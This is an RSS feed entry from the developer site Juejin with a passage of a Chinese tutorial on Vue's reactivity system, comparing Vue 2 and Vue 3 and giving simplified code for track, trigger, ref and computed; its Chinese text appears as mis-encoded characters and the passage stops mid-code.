<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Vue å“åº”å¼åŸç†æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7592768559170256922</link>    <guid>https://juejin.cn/post/7592768559170256922</guid>    <pubDate>2026-01-08T08:57:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592768559170256922" data-draft-id="7592768559170191386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue å“åº”å¼åŸç†æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-08T08:57:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ»¡å¤©æ˜Ÿè¾°"/> <meta itemprop="url" content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue å“åº”å¼åŸç†æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ»¡å¤©æ˜Ÿè¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:57:35.000Z" title="Thu Jan 08 2026 08:57:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ—ï¸Â <strong>æ ¸å¿ƒæ¶æ„æ¦‚è§ˆ</strong></h2>
<h3 data-id="heading-1">1.Â <strong>å“åº”å¼ç³»ç»Ÿä¸‰å±‚æ¶æ„</strong></h3>
<pre><code class="hljs language-text" lang="text">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           ç»„ä»¶æ¸²æŸ“ç³»ç»Ÿ (Renderer)        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚         å“åº”å¼ç³»ç»Ÿ (Reactivity)          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  ä¾èµ–æ”¶é›†    â”‚  â”‚  è§¦å‘æ›´æ–°         â”‚  â”‚
â”‚  â”‚  (Track)    â”‚  â”‚  (Trigger)       â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚       åŸå§‹å“åº”å¼å¯¹è±¡ (Raw Objects)       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h2 data-id="heading-2">ğŸ”„Â <strong>Vue 2 vs Vue 3 å“åº”å¼åŸç†å¯¹æ¯”</strong></h2>
<h3 data-id="heading-3">2.Â <strong>Vue 2: Object.defineProperty</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 2 å“åº”å¼å®ç°ç®€åŒ–ç‰ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">defineReactive</span>(<span class="hljs-params">obj, key, val</span>) {
  <span class="hljs-comment">// ä¸ºæ¯ä¸ªå±æ€§åˆ›å»º Depï¼ˆä¾èµ–æ”¶é›†å™¨ï¼‰</span>
  <span class="hljs-keyword">const</span> dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dep</span>()
  
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, key, {
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Dep</span>.<span class="hljs-property">target</span>) {
        dep.<span class="hljs-title function_">depend</span>()  <span class="hljs-comment">// æ”¶é›†å½“å‰ watcher</span>
      }
      <span class="hljs-keyword">return</span> val
    },
    <span class="hljs-title function_">set</span>(<span class="hljs-params">newVal</span>) {
      <span class="hljs-keyword">if</span> (newVal === val) <span class="hljs-keyword">return</span>
      val = newVal
      <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
      dep.<span class="hljs-title function_">notify</span>()
    }
  })
}

<span class="hljs-comment">// é€’å½’å¯¹è±¡å®ç°æ·±åº¦å“åº”å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">observe</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span> || obj === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// é€’å½’å¤„ç†å¯¹è±¡å±æ€§</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
    <span class="hljs-title function_">defineReactive</span>(obj, key, obj[key])
  })
}

<span class="hljs-comment">// Vue 2 çš„å±€é™æ€§ï¼š</span>
<span class="hljs-comment">// 1. æ— æ³•æ£€æµ‹å¯¹è±¡å±æ€§çš„æ·»åŠ /åˆ é™¤</span>
<span class="hljs-comment">// 2. æ•°ç»„å˜å¼‚æ–¹æ³•éœ€è¦ç‰¹æ®Šå¤„ç†</span>
<span class="hljs-comment">// 3. æ€§èƒ½é—®é¢˜ï¼šé€’å½’éå†æ‰€æœ‰å±æ€§</span>
</code></pre>
<h3 data-id="heading-4">3.Â <strong>Vue 3: Proxy + Reflect</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 3 å“åº”å¼å®ç°ç®€åŒ–ç‰ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createReactiveObject</span>(target)
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createReactiveObject</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-comment">// åˆ›å»ºå“åº”å¼å¤„ç†å™¨</span>
  <span class="hljs-keyword">const</span> handler = {
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver)
      <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
      <span class="hljs-title function_">track</span>(target, key)
      <span class="hljs-comment">// æ·±åº¦å“åº”å¼ï¼šå¦‚æœå€¼æ˜¯å¯¹è±¡ï¼Œé€’å½’å¤„ç†</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> &amp;&amp; result !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">reactive</span>(result)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value, receiver</span>) {
      <span class="hljs-keyword">const</span> oldValue = target[key]
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver)
      
      <span class="hljs-comment">// åªæœ‰å€¼å˜åŒ–æ—¶æ‰è§¦å‘æ›´æ–°</span>
      <span class="hljs-keyword">if</span> (oldValue !== value) {
        <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
        <span class="hljs-title function_">trigger</span>(target, key)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">deleteProperty</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> hasKey = <span class="hljs-title function_">hasOwn</span>(target, key)
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key)
      
      <span class="hljs-keyword">if</span> (hasKey &amp;&amp; result) {
        <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
        <span class="hljs-title function_">trigger</span>(target, key)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">has</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(target, key)
      <span class="hljs-title function_">track</span>(target, key)
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">ownKeys</span>(<span class="hljs-params">target</span>) {
      <span class="hljs-title function_">track</span>(target, <span class="hljs-variable constant_">ITERATE_KEY</span>)  <span class="hljs-comment">// è¿½è¸ªè¿­ä»£æ“ä½œ</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(target)
    }
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler)
}

<span class="hljs-comment">// Vue 3 çš„ä¼˜åŠ¿ï¼š</span>
<span class="hljs-comment">// 1. æ”¯æŒå¯¹è±¡å±æ€§çš„æ·»åŠ /åˆ é™¤</span>
<span class="hljs-comment">// 2. æ›´å¥½çš„æ€§èƒ½ï¼ˆæƒ°æ€§ä»£ç†ï¼‰</span>
<span class="hljs-comment">// 3. æ”¯æŒ Mapã€Set ç­‰é›†åˆç±»å‹</span>
<span class="hljs-comment">// 4. æ›´ç²¾ç»†çš„ä¾èµ–è¿½è¸ª</span>
</code></pre>
<h2 data-id="heading-5">ğŸ¯Â <strong>æ ¸å¿ƒæ¦‚å¿µè¯¦è§£</strong></h2>
<h3 data-id="heading-6">4.Â <strong>ä¾èµ–æ”¶é›† (Track)</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å…¨å±€çš„ä¾èµ–æ”¶é›†æ ˆ</span>
<span class="hljs-keyword">let</span> activeEffect = <span class="hljs-literal">null</span>
<span class="hljs-keyword">const</span> targetMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>()  <span class="hljs-comment">// ç›®æ ‡å¯¹è±¡ â†’ é”® â†’ ä¾èµ–é›†åˆ</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params">target, key</span>) {
  <span class="hljs-keyword">if</span> (!activeEffect) <span class="hljs-keyword">return</span>
  
  <span class="hljs-comment">// è·å–ç›®æ ‡å¯¹è±¡çš„ä¾èµ–æ˜ å°„</span>
  <span class="hljs-keyword">let</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target)
  <span class="hljs-keyword">if</span> (!depsMap) {
    targetMap.<span class="hljs-title function_">set</span>(target, (depsMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()))
  }
  
  <span class="hljs-comment">// è·å–å±æ€§çš„ä¾èµ–é›†åˆ</span>
  <span class="hljs-keyword">let</span> dep = depsMap.<span class="hljs-title function_">get</span>(key)
  <span class="hljs-keyword">if</span> (!dep) {
    depsMap.<span class="hljs-title function_">set</span>(key, (dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()))
  }
  
  <span class="hljs-comment">// æ”¶é›†å½“å‰ effect</span>
  dep.<span class="hljs-title function_">add</span>(activeEffect)
  activeEffect.<span class="hljs-property">deps</span>.<span class="hljs-title function_">push</span>(dep)  <span class="hljs-comment">// åå‘è®°å½•ï¼Œç”¨äºæ¸…ç†</span>
}

<span class="hljs-comment">// Effect ç±»ï¼ˆç›¸å½“äº Vue 2 çš„ Watcherï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveEffect</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">fn, scheduler</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fn</span> = fn
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">scheduler</span> = scheduler
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deps</span> = []  <span class="hljs-comment">// ä¾èµ–æ­¤ effect çš„æ‰€æœ‰ dep</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">true</span>
  }
  
  <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fn</span>()
    
    <span class="hljs-comment">// ä¿å­˜å½“å‰ effectï¼Œå¼€å§‹ä¾èµ–æ”¶é›†</span>
    <span class="hljs-keyword">const</span> lastEffect = activeEffect
    activeEffect = <span class="hljs-variable language_">this</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fn</span>()
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-comment">// æ¢å¤ä¹‹å‰çš„ effect</span>
      activeEffect = lastEffect
    }
  }
  
  <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span>) {
      <span class="hljs-comment">// æ¸…ç†æ‰€æœ‰ä¾èµ–</span>
      <span class="hljs-title function_">cleanupEffect</span>(<span class="hljs-variable language_">this</span>)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">false</span>
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">cleanupEffect</span>(<span class="hljs-params">effect</span>) {
  <span class="hljs-keyword">const</span> { deps } = effect
  deps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">dep</span> =&gt;</span> {
    dep.<span class="hljs-title function_">delete</span>(effect)
  })
  deps.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>
}
</code></pre>
<h3 data-id="heading-7">5.Â <strong>è§¦å‘æ›´æ–° (Trigger)</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">target, key, type = <span class="hljs-string">'SET'</span></span>) {
  <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target)
  <span class="hljs-keyword">if</span> (!depsMap) <span class="hljs-keyword">return</span>
  
  <span class="hljs-comment">// è·å–è¯¥å±æ€§çš„ä¾èµ– effects</span>
  <span class="hljs-keyword">const</span> effects = depsMap.<span class="hljs-title function_">get</span>(key)
  
  <span class="hljs-comment">// è·å–è¿­ä»£æ“ä½œçš„ä¾èµ–ï¼ˆç”¨äº for...in, Object.keys ç­‰ï¼‰</span>
  <span class="hljs-keyword">const</span> iterateEffects = depsMap.<span class="hljs-title function_">get</span>(<span class="hljs-variable constant_">ITERATE_KEY</span>)
  
  <span class="hljs-keyword">const</span> effectsToRun = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  
  <span class="hljs-comment">// æ”¶é›†éœ€è¦æ‰§è¡Œçš„ effects</span>
  <span class="hljs-keyword">if</span> (effects) {
    effects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (effect !== activeEffect) {
        effectsToRun.<span class="hljs-title function_">add</span>(effect)
      }
    })
  }
  
  <span class="hljs-comment">// å¯¹äºæ·»åŠ /åˆ é™¤å±æ€§ï¼Œéœ€è¦è§¦å‘è¿­ä»£ä¾èµ–</span>
  <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'ADD'</span> || type === <span class="hljs-string">'DELETE'</span>) {
    <span class="hljs-keyword">if</span> (iterateEffects) {
      iterateEffects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (effect !== activeEffect) {
          effectsToRun.<span class="hljs-title function_">add</span>(effect)
        }
      })
    }
  }
  
  <span class="hljs-comment">// æ‰§è¡Œ effects</span>
  effectsToRun.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (effect.<span class="hljs-property">scheduler</span>) {
      effect.<span class="hljs-title function_">scheduler</span>()  <span class="hljs-comment">// è°ƒåº¦æ‰§è¡Œï¼ˆç”¨äº computedã€watchï¼‰</span>
    } <span class="hljs-keyword">else</span> {
      effect.<span class="hljs-title function_">run</span>()  <span class="hljs-comment">// ç«‹å³æ‰§è¡Œ</span>
    }
  })
}
</code></pre>
<h2 data-id="heading-8">âš¡Â <strong>å“åº”å¼ API å®ç°</strong></h2>
<h3 data-id="heading-9">6.Â <strong>ref å®ç°åŸç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RefImpl</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value, shallow = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = shallow ? value : <span class="hljs-title function_">toReactive</span>(value)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = value
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">__v_isRef</span> = <span class="hljs-literal">true</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_shallow</span> = shallow
    
    <span class="hljs-comment">// ä¸º ref åˆ›å»ºä¾èµ–é›†åˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  }
  
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
    <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
  }
  
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasChanged</span>(newVal, <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span>)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = newVal
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">_shallow</span> ? newVal : <span class="hljs-title function_">toReactive</span>(newVal)
      <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
      <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>)
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">if</span> (activeEffect) {
    ref.<span class="hljs-property">dep</span>.<span class="hljs-title function_">add</span>(activeEffect)
    activeEffect.<span class="hljs-property">deps</span>.<span class="hljs-title function_">push</span>(ref.<span class="hljs-property">dep</span>)
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">const</span> effects = ref.<span class="hljs-property">dep</span>
  effects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (effect.<span class="hljs-property">scheduler</span>) {
      effect.<span class="hljs-title function_">scheduler</span>()
    } <span class="hljs-keyword">else</span> {
      effect.<span class="hljs-title function_">run</span>()
    }
  })
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">toReactive</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isObject</span>(value) ? <span class="hljs-title function_">reactive</span>(value) : value
}
</code></pre>
<h3 data-id="heading-10">7.Â <strong>computed å®ç°åŸç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputedRefImpl</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">getter, setter</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_getter</span> = getter
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_setter</span> = setter
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-literal">undefined</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment">// è„æ£€æŸ¥æ ‡å¿—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReactiveEffect</span>(
      getter,
      <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// å½“ä¾èµ–å˜åŒ–æ—¶ï¼Œæ ‡è®°ä¸ºè„</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>
          <span class="hljs-comment">// è§¦å‘ä¾èµ– computed çš„ effects</span>
          <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>)
        }
      }
    )
  }
  
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
    <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)
    
    <span class="hljs-comment">// å¦‚æœè„äº†ï¼Œé‡æ–°è®¡ç®—</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">false</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span>.<span class="hljs-title function_">run</span>()
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
  }
  
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_setter</span>) {
